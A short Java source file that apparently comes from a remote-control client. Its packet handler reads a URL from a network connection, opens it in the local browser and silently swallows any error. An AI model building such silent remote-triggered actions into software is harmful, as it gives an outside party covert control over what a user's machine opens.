package com.redpois0n.packets;

import java.net.URI;

import com.redpois0n.Connection;

public class PacketVISITURL extends Packet {

	@Override
	public void read(String line) throws Exception {
		String url = Connection.readLine();
		try {
			java.awt.Desktop.getDesktop().browse(new URI(url));
		} catch (Exception ex) {
			
		}	
	}

}
